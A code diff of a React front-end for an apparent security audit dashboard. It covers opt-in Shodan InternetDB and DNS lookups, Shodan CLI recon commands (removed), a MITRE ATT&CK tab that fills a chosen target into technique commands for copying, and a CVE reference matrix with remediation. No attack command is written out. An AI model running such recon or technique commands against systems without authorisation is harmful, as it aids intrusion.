+                  Opt-In Public OSINT Lookups
+                </Typography>
+                <Chip
+                  size="small"
+                  label="OPT-IN PUBLIC LOOKUPS"
+                  sx={{ fontFamily: mono, fontWeight: 800, bgcolor: palette.goldSoft, color: palette.gold, border: `1px solid ${palette.goldBorder}` }}
+                />
+              </Stack>
+              <Alert severity="info" sx={{ mb: 2, fontFamily: mono, fontSize: '0.74rem' }}>
+                Manual opt-in only: clicking these buttons sends direct browser queries to public DNS-over-HTTPS (<code>dns.google</code>) or unauthenticated Shodan InternetDB (<code>internetdb.shodan.io</code>). Zero requests fire on page load.
+              </Alert>
 
-                <Stack direction="row" spacing={1} alignItems="center" flexWrap="wrap">
-                  <Chip
-                    icon={<CheckCircleIcon sx={{ fontSize: '0.85rem !important', color: `${emerald} !important` }} />}
-                    label="SHODAN CLI INITIALIZED"
-                    size="small"
-                    sx={{ bgcolor: emeraldSoft, color: emerald, fontWeight: 700, fontFamily: mono, border: `1px solid ${emeraldBorder}` }}
-                  />
-                  <Chip
-                    label="API: UNMETERED INTERNETDB"
-                    size="small"
-                    sx={{ bgcolor: cyanSoft, color: cyan, fontWeight: 700, fontFamily: mono }}
-                  />
-                </Stack>
-              </Box>
-
-              {/* Shodan Query Input */}
-              <Grid container spacing={2} alignItems="center">
-                <Grid xs={12} sm={8} md={9}>
-                  <TextField
-                    fullWidth
-                    size="small"
-                    label="IPv4 Address or Domain"
-                    value={shodanInputIp}
-                    onChange={(e) => setShodanInputIp(e.target.value)}
-                    placeholder="e.g. 99.83.231.61, 1.1.1.1, nullai.tech"
-                    InputProps={{
-                      startAdornment: (
-                        <InputAdornment position="start">
-                          <DnsIcon sx={{ color: crimson, fontSize: 18 }} />
-                        </InputAdornment>
-                      ),
-                      sx: { fontFamily: mono, fontSize: '0.85rem' }
-                    }}
-                  />
-                </Grid>
-
-                <Grid xs={12} sm={4} md={3}>
+              <Stack spacing={2}>
+                <Box>
                   <Button
-                    fullWidth
-                    variant="contained"
-                    disabled={isQueryingShodan}
-                    onClick={() => queryShodan(shodanInputIp)}
-                    startIcon={<SearchIcon />}
-                    sx={{
-                      bgcolor: crimson,
-                      color: '#FFF',
-                      fontWeight: 800,
-                      fontFamily: mono,
-                      fontSize: '0.78rem',
-                      py: 1,
-                      '&:hover': { bgcolor: '#E02444' }
-                    }}
+                    variant="outlined"
+                    onClick={() => resolveDoH(targetScope)}
+                    disabled={isResolvingDoh}
+                    startIcon={<DnsIcon />}
+                    sx={{ minHeight: 44, fontFamily: mono, fontSize: '0.74rem', color: palette.cyan, borderColor: palette.cyanBorder }}
                   >
-                    {isQueryingShodan ? 'QUERYING...' : 'QUERY SHODAN'}
+                    {isResolvingDoh ? 'Querying DoH...' : `Opt-In DoH Query (${targetScope})`}
                   </Button>
-                </Grid>
-              </Grid>
-
-              {shodanError && (
-                <Alert severity="warning" sx={{ mt: 2, fontFamily: mono, fontSize: '0.75rem' }}>
-                  {shodanError}
-                </Alert>
-              )}
-            </Paper>
-          </Grid>
-
-          {/* Shodan Results */}
-          <Grid xs={12} md={7}>
-            <Paper sx={{ p: 2.5, borderRadius: 2.5, bgcolor: isDark ? '#10121A' : '#FFFFFF', border: `1px solid ${cardBorder}`, height: '100%' }}>
-              <Typography variant="subtitle1" sx={{ fontWeight: 800, mb: 1, color: gold }}>
-                📡 Public Internet Exposure Data
-              </Typography>
-              <Typography variant="body2" sx={{ color: 'text.secondary', mb: 2 }}>
-                Real telemetry aggregated from global Shodan crawler nodes.
-              </Typography>
-
-              {!shodanData ? (
-                <Box sx={{ p: 4, textAlign: 'center', bgcolor: voidDark, borderRadius: 2, border: '1px dashed rgba(255,255,255,0.1)' }}>
-                  <Typography variant="caption" sx={{ fontFamily: mono, color: '#94A3B8' }}>
-                    Enter an IP address or click "Query Shodan" to inspect public InternetDB records.
-                  </Typography>
-                </Box>
-              ) : (
-                <Stack spacing={2}>
-                  {/* Target IP & Tags */}
-                  <Box sx={{ p: 1.5, bgcolor: voidDark, borderRadius: 2, border: '1px solid rgba(255,255,255,0.08)' }}>
-                    <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: 1 }}>
-                      <Typography sx={{ fontFamily: mono, fontSize: '0.9rem', color: '#FFF', fontWeight: 800 }}>
-                        IP: <span style={{ color: cyan }}>{shodanData.ip}</span>
-                      </Typography>
-                      <Stack direction="row" spacing={0.8}>
-                        {(shodanData.tags || []).map((t, idx) => (
-                          <Chip key={idx} label={t} size="small" sx={{ fontFamily: mono, fontSize: '0.65rem', bgcolor: goldSoft, color: gold }} />
-                        ))}
-                      </Stack>
-                    </Box>
-                  </Box>
-
-                  {/* Open Ports */}
-                  <Box sx={{ p: 1.5, bgcolor: voidDark, borderRadius: 2, border: '1px solid rgba(255,255,255,0.08)' }}>
-                    <Typography variant="caption" sx={{ color: '#94A3B8', fontWeight: 700, fontFamily: mono, display: 'block', mb: 1 }}>
-                      OPEN PORTS INDEXED ON PUBLIC WAN:
+                  {dohError && (
+                    <Typography variant="caption" sx={{ display: 'block', mt: 1, color: palette.crimson, fontFamily: mono }}>
+                      {dohError}
                     </Typography>
-                    {(shodanData.ports && shodanData.ports.length > 0) ? (
-                      <Stack direction="row" spacing={1} flexWrap="wrap" useFlexGap>
-                        {shodanData.ports.map((port) => (
-                          <Chip
-                            key={port}
-                            label={`Port ${port}`}
-                            size="small"
-                            sx={{ fontFamily: mono, fontSize: '0.72rem', fontWeight: 800, bgcolor: crimsonSoft, color: crimson, border: `1px solid ${crimsonBorder}` }}
-                          />
-                        ))}
-                      </Stack>
-                    ) : (
-                      <Typography variant="caption" sx={{ color: emerald, fontFamily: mono }}>
-                        ✓ Zero exposed ports detected by Shodan crawlers.
-                      </Typography>
-                    )}
-                  </Box>
-
-                  {/* Confirmed Vulnerabilities (CVEs) */}
-                  <Box sx={{ p: 1.5, bgcolor: voidDark, borderRadius: 2, border: '1px solid rgba(255,255,255,0.08)' }}>
-                    <Typography variant="caption" sx={{ color: '#94A3B8', fontWeight: 700, fontFamily: mono, display: 'block', mb: 1 }}>
-                      CONFIRMED CVE VULNERABILITIES:
-                    </Typography>
-                    {(shodanData.vulns && shodanData.vulns.length > 0) ? (
-                      <Stack direction="row" spacing={1} flexWrap="wrap" useFlexGap>
-                        {shodanData.vulns.map((cve) => (
-                          <Chip
-                            key={cve}
-                            label={cve}
-                            size="small"
-                            component="a"
-                            href={`https://nvd.nist.gov/vuln/detail/${cve}`}
-                            target="_blank"
-                            rel="noopener"
-                            clickable
-                            sx={{ fontFamily: mono, fontSize: '0.72rem', fontWeight: 800, bgcolor: 'rgba(255,51,85,0.25)', color: crimson, border: `1px solid ${crimson}` }}
-                          />
-                        ))}
-                      </Stack>
-                    ) : (
-                      <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
-                        <CheckCircleIcon sx={{ color: emerald, fontSize: 16 }} />
-                        <Typography variant="caption" sx={{ color: emerald, fontFamily: mono, fontWeight: 700 }}>
-                          0 Known CVEs indexed across Shodan vulnerability databases.
+                  )}
+                  {dohRecords.length > 0 && (
+                    <Paper sx={{ mt: 1.5, p: 1.2, bgcolor: palette.codeBg, border: `1px solid ${palette.border}`, maxHeight: 140, overflowY: 'auto' }}>
+                      {dohRecords.map((r, i) => (
+                        <Typography key={i} sx={{ fontFamily: mono, fontSize: '0.72rem', color: palette.codeInk }}>
+                          [{r.type}] {r.name} → {r.data} (TTL {r.ttl}s)
                         </Typography>
-                      </Box>
-                    )}
-                  </Box>
+                      ))}
+                    </Paper>
+                  )}
+                </Box>
 
-                  {/* Associated Hostnames */}
-                  <Box sx={{ p: 1.5, bgcolor: voidDark, borderRadius: 2, border: '1px solid rgba(255,255,255,0.08)' }}>
-                    <Typography variant="caption" sx={{ color: '#94A3B8', fontWeight: 700, fontFamily: mono, display: 'block', mb: 0.5 }}>
-                      ASSOCIATED HOSTNAMES:
+                <Box>
+                  <Stack direction={{ xs: 'column', sm: 'row' }} spacing={1}>
+                    <TextField
+                      fullWidth
+                      size="small"
+                      label="Public IPv4 for Shodan InternetDB"
+                      value={shodanInputIp}
+                      onChange={(e) => setShodanInputIp(e.target.value)}
+                      InputProps={{ sx: { fontFamily: mono, fontSize: '0.8rem' } }}
+                    />
+                    <Button
+                      variant="contained"
+                      disabled={isQueryingShodan}
+                      onClick={() => queryShodan(shodanInputIp)}
+                      startIcon={<SearchIcon />}
+                      sx={{ minHeight: 44, bgcolor: palette.crimsonBtn, color: '#FFFFFF', fontFamily: mono, fontWeight: 800, fontSize: '0.74rem', whiteSpace: 'nowrap', '&:hover': { bgcolor: palette.crimsonBtnHover } }}
+                    >
+                      {isQueryingShodan ? 'Querying...' : 'Query InternetDB'}
+                    </Button>
+                  </Stack>
+                  {shodanError && (
+                    <Typography variant="caption" sx={{ display: 'block', mt: 1, color: palette.crimson, fontFamily: mono }}>
+                      {shodanError}
                     </Typography>
-                    <Typography variant="body2" sx={{ fontFamily: mono, fontSize: '0.72rem', color: '#CBD5E1', wordBreak: 'break-all' }}>
-                      {(shodanData.hostnames && shodanData.hostnames.length > 0) ? shodanData.hostnames.join(', ') : 'None indexed'}
-                    </Typography>
-                  </Box>
-
-                  {/* CPE Software Signatures */}
-                  <Box sx={{ p: 1.5, bgcolor: voidDark, borderRadius: 2, border: '1px solid rgba(255,255,255,0.08)' }}>
-                    <Typography variant="caption" sx={{ color: '#94A3B8', fontWeight: 700, fontFamily: mono, display: 'block', mb: 0.5 }}>
-                      CPE SOFTWARE SIGNATURES:
-                    </Typography>
-                    <Typography variant="body2" sx={{ fontFamily: mono, fontSize: '0.72rem', color: '#38BDF8', wordBreak: 'break-all' }}>
-                      {(shodanData.cpes && shodanData.cpes.length > 0) ? shodanData.cpes.join(', ') : 'None indexed'}
-                    </Typography>
-                  </Box>
-                </Stack>
-              )}
-            </Paper>
-          </Grid>
-
-          {/* Shodan CLI Command Center */}
-          <Grid xs={12} md={5}>
-            <Paper sx={{ p: 2.5, borderRadius: 2.5, bgcolor: isDark ? '#10121A' : '#FFFFFF', border: `1px solid ${cardBorder}`, height: '100%' }}>
-              <Typography variant="subtitle1" sx={{ fontWeight: 800, mb: 1, color: cyan }}>
-                💻 Authenticated Shodan CLI Commands
-              </Typography>
-              <Typography variant="body2" sx={{ color: 'text.secondary', mb: 2 }}>
-                Run these in your ZothOS terminal with your initialized account:
-              </Typography>
-
-              <Stack spacing={1.5}>
-                {[
-                  { label: 'Host Deep Scan', cmd: `shodan host ${shodanData ? shodanData.ip : shodanInputIp}` },
-                  { label: 'Domain Technology Scan', cmd: `shodan search "hostname:${targetScope}"` },
-                  { label: 'Check Shodan Account Credits', cmd: 'shodan info' },
-                  { label: 'Display Public IP', cmd: 'shodan myip' },
-                  { label: 'Port 22 OpenSSH Stats', cmd: 'shodan count "port:22 product:OpenSSH"' }
-                ].map((item, idx) => (
-                  <Box key={idx} sx={{ p: 1.2, bgcolor: voidDark, borderRadius: 1.5, border: '1px solid rgba(255,255,255,0.08)' }}>
-                    <Typography variant="caption" sx={{ color: gold, fontFamily: mono, fontWeight: 700, display: 'block' }}>
-                      {item.label}
-                    </Typography>
-                    <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mt: 0.5 }}>
-                      <Typography sx={{ fontFamily: mono, fontSize: '0.72rem', color: '#38BDF8', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', mr: 1 }}>
-                        {item.cmd}
+                  )}
+                  {shodanData && (
+                    <Paper sx={{ mt: 1.5, p: 1.25, bgcolor: palette.subtleBg, border: `1px solid ${palette.border}` }}>
+                      <Typography sx={{ fontFamily: mono, fontSize: '0.74rem', fontWeight: 800, color: palette.textPrimary }}>
+                        IP: {shodanData.ip} · Ports: [{(shodanData.ports || []).join(', ') || 'None'}]
                       </Typography>
-                      <IconButton size="small" onClick={() => handleCopy(item.cmd, `shodan_${idx}`)} sx={{ color: '#94A3B8' }}>
-                        <ContentCopyIcon sx={{ fontSize: 14 }} />
-                      </IconButton>
-                    </Box>
-                  </Box>
-                ))}
+                      <Typography sx={{ fontFamily: mono, fontSize: '0.72rem', color: palette.textSecondary, mt: 0.5 }}>
+                        CVEs: {(shodanData.vulns || []).length > 0 ? shodanData.vulns.join(', ') : 'None indexed'}
+                      </Typography>
+                    </Paper>
+                  )}
+                </Box>
               </Stack>
             </Paper>
           </Grid>
         </Grid>
       )}
 
-      {/* =====================================================================
-          TAB 4: MITRE ATT&CK MATRIX
-          ===================================================================== */}
+      {/* TAB 4: MITRE ATT&CK MATRIX */}
       {activeTab === 4 && (
-        <Grid container spacing={3}>
+        <Grid container spacing={2.5}>
           <Grid xs={12} md={4}>
-            <Paper sx={{ p: 2, bgcolor: isDark ? '#10121A' : '#FFFFFF', border: `1px solid ${cardBorder}`, borderRadius: 2 }}>
-              <Typography variant="subtitle2" sx={{ fontWeight: 800, mb: 1.5, color: gold }}>
-                14 MITRE ATT&CK ENTERPRISE TACTICS
+            <Paper sx={{ p: 2, bgcolor: palette.cardBg, border: `1px solid ${palette.border}`, borderRadius: 2 }}>
+              <Typography component="h3" variant="subtitle2" sx={{ fontWeight: 800, mb: 1.5, color: palette.gold }}>
+                14 MITRE ATT&amp;CK TACTICS
               </Typography>
               <Stack spacing={0.8}>
                 {MITRE_TACTICS.map((tactic) => {
-                  const isSelected = selectedMitreTactic.id === tactic.id;
+                  const selected = selectedMitreTactic.id === tactic.id;
                   return (
-                    <Box
+                    <Button
                       key={tactic.id}
+                      fullWidth
                       onClick={() => setSelectedMitreTactic(tactic)}
                       sx={{
-                        p: 1.2,
-                        borderRadius: 1.5,
-                        cursor: 'pointer',
-                        bgcolor: isSelected ? crimsonSoft : isDark ? 'rgba(255,255,255,0.03)' : '#F8FAFC',
-                        border: `1px solid ${isSelected ? crimsonBorder : 'transparent'}`,
-                        transition: 'all 0.15s ease',
-                        '&:hover': { bgcolor: crimsonSoft }
+                        minHeight: 44,
+                        justifyContent: 'space-between',
+                        px: 1.5,
+                        textTransform: 'none',
+                        fontFamily: mono,
+                        fontSize: '0.76rem',
+                        fontWeight: selected ? 800 : 600,
+                        bgcolor: selected ? palette.crimsonSoft : palette.subtleBg,
+                        color: selected ? palette.crimson : palette.textPrimary,
+                        border: `1px solid ${selected ? palette.crimsonBorder : palette.border}`,
                       }}
                     >
-                      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
-                        <Typography sx={{ fontFamily: mono, fontSize: '0.78rem', fontWeight: isSelected ? 800 : 600, color: isSelected ? crimson : 'text.primary' }}>
-                          {tactic.name}
-                        </Typography>
-                        <Chip
-                          label={tactic.id}
-                          size="small"
-                          sx={{ fontFamily: mono, fontSize: '0.65rem', height: 20 }}
-                        />
-                      </Box>
-                      <Typography variant="caption" sx={{ color: 'text.secondary', fontSize: '0.68rem' }}>
-                        {tactic.techniques.length} documented technique vectors
-                      </Typography>
-                    </Box>
+                      <span>{tactic.name}</span>
+                      <span>{tactic.id}</span>
+                    </Button>
                   );
                 })}
               </Stack>
@@ -1917,71 +1508,44 @@ ${OFFENSIVE_ARSENAL[4].cmd(targetScope)}
           </Grid>
 
           <Grid xs={12} md={8}>
-            <Paper sx={{ p: 2.5, bgcolor: isDark ? '#10121A' : '#FFFFFF', border: `1px solid ${cardBorder}`, borderRadius: 2 }}>
-              <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 2 }}>
-                <Box>
-                  <Typography variant="h6" sx={{ fontWeight: 800, color: isDark ? '#FFF' : '#111827' }}>
-                    {selectedMitreTactic.name} <span style={{ color: gold, fontSize: '0.85rem' }}>({selectedMitreTactic.id})</span>
-                  </Typography>
-                  <Typography variant="caption" sx={{ color: 'text.secondary' }}>
-                    Enterprise adversary behavior phase and tactical countermeasures.
-                  </Typography>
-                </Box>
-                <Chip
-                  label={`${selectedMitreTactic.techniques.length} Techniques`}
-                  size="small"
-                  sx={{ bgcolor: crimsonSoft, color: crimson, fontWeight: 700, fontFamily: mono }}
-                />
-              </Box>
-
+            <Paper sx={{ p: 2.25, bgcolor: palette.cardBg, border: `1px solid ${palette.border}`, borderRadius: 2 }}>
+              <Typography component="h3" variant="h6" sx={{ fontWeight: 800, color: palette.textPrimary, mb: 2 }}>
+                {selectedMitreTactic.name} <span style={{ color: palette.gold, fontSize: '0.88rem' }}>({selectedMitreTactic.id})</span>
+              </Typography>
               <Stack spacing={2}>
                 {selectedMitreTactic.techniques.map((tech) => (
-                  <Card key={tech.id} sx={{ bgcolor: voidDark, border: '1px solid rgba(255,255,255,0.08)', borderRadius: 2 }}>
+                  <Card key={tech.id} sx={{ bgcolor: palette.subtleBg, border: `1px solid ${palette.border}`, borderRadius: 2 }}>
                     <CardContent sx={{ p: 2 }}>
-                      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', mb: 1 }}>
+                      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', mb: 1, gap: 1 }}>
                         <Box>
-                          <Typography variant="subtitle2" sx={{ fontWeight: 800, color: '#F8FAFC' }}>
-                            {tech.name} <span style={{ color: cyan, fontSize: '0.75rem', fontFamily: mono }}>({tech.id})</span>
+                          <Typography variant="subtitle2" sx={{ fontWeight: 800, color: palette.textPrimary }}>
+                            {tech.name} <span style={{ color: palette.cyan, fontFamily: mono }}>({tech.id})</span>
                           </Typography>
-                          <Typography variant="caption" sx={{ color: gold, fontFamily: mono }}>
-                            Sub-technique: {tech.sub}
+                          <Typography variant="caption" sx={{ color: palette.gold, fontFamily: mono }}>
+                            {tech.sub}
                           </Typography>
                         </Box>
-                        <Chip
-                          label={tech.severity}
-                          size="small"
-                          sx={{
-                            fontFamily: mono,
-                            fontSize: '0.65rem',
-                            fontWeight: 700,
-                            bgcolor: tech.severity === 'Critical' ? 'rgba(255,51,85,0.2)' : tech.severity === 'High' ? 'rgba(212,175,55,0.2)' : 'rgba(56,189,248,0.2)',
-                            color: tech.severity === 'Critical' ? crimson : tech.severity === 'High' ? gold : cyan
-                          }}
-                        />
+                        <Chip label={tech.severity} size="small" sx={{ fontFamily: mono, fontWeight: 800, bgcolor: palette.crimsonSoft, color: palette.crimson }} />
                       </Box>
-
-                      <Typography variant="body2" sx={{ color: '#CBD5E1', fontSize: '0.78rem', mb: 1.5 }}>
+                      <Typography variant="body2" sx={{ color: palette.textSecondary, mb: 1.25 }}>
                         {tech.desc}
                       </Typography>
-
-                      <Typography variant="caption" sx={{ color: '#94A3B8', fontWeight: 700, fontFamily: mono, display: 'block', mb: 0.5 }}>
-                        OPERATIONAL EXECUTION PROOF:
-                      </Typography>
-                      <Paper sx={{ p: 1, bgcolor: '#000000', borderRadius: 1.5, border: '1px solid rgba(255,255,255,0.06)', mb: 1.5, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
-                        <Typography sx={{ fontFamily: mono, fontSize: '0.72rem', color: '#38BDF8', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
+                      <Paper sx={{ p: 1, bgcolor: palette.codeBg, border: `1px solid ${palette.border}`, borderRadius: 1.5, mb: 1.25, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                        <Typography sx={{ fontFamily: mono, fontSize: '0.73rem', color: palette.codeInk, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                           {tech.cmd.replace('{target}', targetScope)}
                         </Typography>
-                        <IconButton size="small" onClick={() => handleCopy(tech.cmd.replace('{target}', targetScope), tech.id)} sx={{ color: '#94A3B8' }}>
-                          <ContentCopyIcon sx={{ fontSize: 14 }} />
+                        <IconButton aria-label={`Copy ${tech.id} command`} onClick={() => handleCopy(tech.cmd.replace('{target}', targetScope), tech.id)} sx={{ minWidth: 44, minHeight: 44, color: palette.textSecondary }}>
+                          <ContentCopyIcon fontSize="small" />
                         </IconButton>
                       </Paper>
-
-                      <Typography variant="caption" sx={{ color: emerald, fontWeight: 700, fontFamily: mono, display: 'block', mb: 0.5 }}>
-                        DEFENSIVE MITIGATION & HARDENING:
-                      </Typography>
-                      <Typography variant="body2" sx={{ color: '#A7F3D0', fontSize: '0.75rem', bgcolor: 'rgba(0,255,157,0.05)', p: 1, borderRadius: 1, border: '1px solid rgba(0,255,157,0.15)' }}>
-                        {tech.mitigation}
-                      </Typography>
+                      <Box sx={{ p: 1.1, borderRadius: 1.5, bgcolor: palette.emeraldSoft, border: `1px solid ${palette.emeraldBorder}` }}>
+                        <Typography variant="caption" sx={{ color: palette.emerald, fontWeight: 800, fontFamily: mono, display: 'block' }}>
+                          DEFENSIVE MITIGATION:
+                        </Typography>
+                        <Typography variant="body2" sx={{ color: palette.textPrimary, fontSize: '0.78rem' }}>
+                          {tech.mitigation}
+                        </Typography>
+                      </Box>
                     </CardContent>
                   </Card>
                 ))}
@@ -1991,42 +1555,23 @@ ${OFFENSIVE_ARSENAL[4].cmd(targetScope)}
         </Grid>
       )}
 
-      {/* =====================================================================
-          TAB 5: CVE THREAT INTELLIGENCE
-          ===================================================================== */}
+      {/* TAB 5: CVE MATRIX */}
       {activeTab === 5 && (
-        <Paper sx={{ p: 2.5, bgcolor: isDark ? '#10121A' : '#FFFFFF', border: `1px solid ${cardBorder}`, borderRadius: 2.5 }}>
-          <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 2.5, flexWrap: 'wrap', gap: 1.5 }}>
-            <Box>
-              <Typography variant="h6" sx={{ fontWeight: 800 }}>
-                CVE Vulnerability & EPSS Threat Radar
-              </Typography>
-              <Typography variant="caption" sx={{ color: 'text.secondary' }}>
-                Curated intelligence database covering critical Linux, SSH, container escape, and web exploits.
-              </Typography>
-            </Box>
-
-            <Stack direction="row" spacing={1.5} alignItems="center">
+        <Paper sx={{ p: 2.25, bgcolor: palette.cardBg, border: `1px solid ${palette.border}`, borderRadius: 2.5 }}>
+          <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 2, flexWrap: 'wrap', gap: 1.5 }}>
+            <Typography component="h3" variant="h6" sx={{ fontWeight: 800, color: palette.textPrimary }}>
+              Reference CVE &amp; EPSS Threat Matrix
+            </Typography>
+            <Stack direction="row" spacing={1}>
               <TextField
                 size="small"
-                placeholder="Search CVE ID, title, package..."
+                placeholder="Search CVE or package..."
                 value={cveSearch}
                 onChange={(e) => setCveSearch(e.target.value)}
-                InputProps={{
-                  startAdornment: (
-                    <InputAdornment position="start">
-                      <SearchIcon fontSize="small" sx={{ color: 'text.secondary' }} />
-                    </InputAdornment>
-                  ),
-                  sx: { fontFamily: mono, fontSize: '0.78rem', width: 220 }
-                }}
+                InputProps={{ sx: { fontFamily: mono, fontSize: '0.78rem', width: 210 } }}
               />
               <FormControl size="small" sx={{ minWidth: 110 }}>
-                <Select
-                  value={cveSeverityFilter}
-                  onChange={(e) => setCveSeverityFilter(e.target.value)}
-                  sx={{ fontFamily: mono, fontSize: '0.78rem' }}
-                >
+                <Select value={cveSeverityFilter} onChange={(e) => setCveSeverityFilter(e.target.value)} sx={{ fontFamily: mono, fontSize: '0.78rem' }}>
                   <MenuItem value="ALL">ALL SEV</MenuItem>
                   <MenuItem value="CRITICAL">CRITICAL</MenuItem>
                   <MenuItem value="HIGH">HIGH</MenuItem>
@@ -2034,55 +1579,31 @@ ${OFFENSIVE_ARSENAL[4].cmd(targetScope)}
               </FormControl>
             </Stack>
           </Box>
-
           <Grid container spacing={2}>
             {filteredCVEs.map((cve) => (
               <Grid xs={12} md={6} key={cve.id}>
-                <Card sx={{ bgcolor: voidDark, border: '1px solid rgba(255,255,255,0.08)', borderRadius: 2, height: '100%' }}>
+                <Card sx={{ bgcolor: palette.subtleBg, border: `1px solid ${palette.border}`, borderRadius: 2, height: '100%' }}>
                   <CardContent sx={{ p: 2 }}>
-                    <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', mb: 1 }}>
-                      <Box>
-                        <Stack direction="row" spacing={1} alignItems="center">
-                          <Typography variant="subtitle2" sx={{ fontWeight: 800, color: crimson, fontFamily: mono }}>
-                            {cve.id}
-                          </Typography>
-                          <Chip
-                            label={`CVSS ${cve.cvss}`}
-                            size="small"
-                            sx={{
-                              fontFamily: mono,
-                              fontSize: '0.65rem',
-                              fontWeight: 800,
-                              bgcolor: cve.cvss >= 9 ? 'rgba(255,51,85,0.2)' : 'rgba(212,175,55,0.2)',
-                              color: cve.cvss >= 9 ? crimson : gold
-                            }}
-                          />
-                        </Stack>
-                        <Typography variant="subtitle2" sx={{ fontWeight: 700, color: '#FFFFFF', mt: 0.5 }}>
-                          {cve.title}
-                        </Typography>
-                      </Box>
-
-                      <Chip
-                        label={`EPSS ${cve.epss}`}
-                        size="small"
-                        sx={{ fontFamily: mono, fontSize: '0.65rem', bgcolor: 'rgba(56,189,248,0.15)', color: cyan, fontWeight: 700 }}
-                      />
-                    </Box>
-
-                    <Typography variant="caption" sx={{ color: 'text.secondary', fontFamily: mono, display: 'block', mb: 1 }}>
-                      Affected: {cve.product} · Vector: {cve.vector}
+                    <Stack direction="row" spacing={1} alignItems="center" justifyContent="space-between" sx={{ mb: 0.75 }}>
+                      <Typography variant="subtitle2" sx={{ fontWeight: 800, color: palette.crimson, fontFamily: mono }}>
+                        {cve.id} · CVSS {cve.cvss}
+                      </Typography>
+                      <Chip label={`EPSS ${cve.epss}`} size="small" sx={{ fontFamily: mono, fontWeight: 700, bgcolor: palette.cyanSoft, color: palette.cyan }} />
+                    </Stack>
+                    <Typography variant="subtitle2" sx={{ fontWeight: 800, color: palette.textPrimary, mb: 0.5 }}>
+                      {cve.title}
                     </Typography>
-
-                    <Typography variant="body2" sx={{ color: '#CBD5E1', fontSize: '0.75rem', mb: 1.5 }}>
+                    <Typography variant="caption" sx={{ color: palette.textSecondary, fontFamily: mono, display: 'block', mb: 1 }}>
+                      {cve.product}
+                    </Typography>
+                    <Typography variant="body2" sx={{ color: palette.textSecondary, fontSize: '0.78rem', mb: 1.25 }}>
                       {cve.description}
                     </Typography>
-
-                    <Box sx={{ bgcolor: 'rgba(0,255,157,0.06)', p: 1, borderRadius: 1.5, border: '1px solid rgba(0,255,157,0.2)' }}>
-                      <Typography variant="caption" sx={{ color: emerald, fontWeight: 700, fontFamily: mono, display: 'block' }}>
+                    <Box sx={{ p: 1, borderRadius: 1.5, bgcolor: palette.emeraldSoft, border: `1px solid ${palette.emeraldBorder}` }}>
+                      <Typography variant="caption" sx={{ color: palette.emerald, fontWeight: 800, fontFamily: mono, display: 'block' }}>
                         REMEDIATION:
                       </Typography>
-                      <Typography variant="caption" sx={{ color: '#A7F3D0', fontSize: '0.72rem' }}>
+                      <Typography variant="caption" sx={{ color: palette.textPrimary }}>
                         {cve.mitigation}
                       </Typography>
                     </Box>
@@ -2094,77 +1615,68 @@ ${OFFENSIVE_ARSENAL[4].cmd(targetScope)}
         </Paper>
       )}
 
-      {/* =====================================================================
-          TAB 6: SOVEREIGN EXECUTIVE REPORT & PAYWALLED EXPORTS
-          ===================================================================== */}
+      {/* TAB 6: HONEST OBSERVED EXECUTIVE REPORT & OPEN EXPORTS */}
       {activeTab === 6 && (
-        <Box sx={{ position: 'relative' }}>
-          {/* Executive Security Audit Report (100% Free & Open Access) */}
-          <Paper
-            sx={{
-              p: 3,
-              borderRadius: 3,
-              bgcolor: isDark ? '#10121A' : '#FFFFFF',
-              border: `1px solid ${cardBorder}`
-            }}
-          >
-            <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 2, flexWrap: 'wrap', gap: 1 }}>
-              <Box>
-                <Typography variant="h6" sx={{ fontWeight: 800 }}>
-                  Sovereign Executive Security Audit Report
-                </Typography>
-                <Typography variant="caption" sx={{ color: 'text.secondary' }}>
-                  Target: {targetScope} · Generated via Zero-Egress HexStrike Engine
-                </Typography>
-              </Box>
-
-              <Stack direction="row" spacing={1}>
-                <Button
-                  variant="outlined"
-                  size="small"
-                  onClick={() => handleCopy(executiveReportMarkdown, 'report_md')}
-                  startIcon={copiedKey === 'report_md' ? <CheckCircleIcon sx={{ fontSize: 14 }} /> : <ContentCopyIcon sx={{ fontSize: 14 }} />}
-                  sx={{ fontFamily: mono, fontSize: '0.72rem', borderColor: goldBorder, color: gold }}
-                >
-                  {copiedKey === 'report_md' ? 'Copied MD' : 'Copy Markdown'}
-                </Button>
-                <Button
-                  variant="contained"
-                  size="small"
-                  onClick={() => {
-                    const blob = new Blob([executiveReportMarkdown], { type: 'text/markdown' });
-                    const url = URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = `hexstrike-audit-${targetScope.replace(/[^a-zA-Z0-9]/g, '_')}.md`;
-                    a.click();
-                  }}
-                  startIcon={<DownloadIcon />}
-                  sx={{ fontFamily: mono, fontSize: '0.72rem', bgcolor: crimson, color: '#FFF' }}
-                >
-                  Export .MD Report
-                </Button>
-              </Stack>
+        <Paper sx={{ p: 2.5, borderRadius: 3, bgcolor: palette.cardBg, border: `1px solid ${palette.border}` }}>
+          <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 2, flexWrap: 'wrap', gap: 1 }}>
+            <Box>
+              <Typography component="h3" variant="h6" sx={{ fontWeight: 800, color: palette.textPrimary }}>
+                Observed Security Audit Report
+              </Typography>
+              <Typography variant="caption" sx={{ color: palette.textSecondary, fontFamily: mono }}>
+                Computed strictly from verified checks · 100% Free &amp; Open Exports (.MD / .JSON / Formula-Safe .CSV)
+              </Typography>
             </Box>
-
-            <Paper sx={{ p: 2, bgcolor: voidDark, borderRadius: 2, border: '1px solid rgba(255,255,255,0.08)' }}>
-              <pre
-                style={{
-                  margin: 0,
-                  fontFamily: mono,
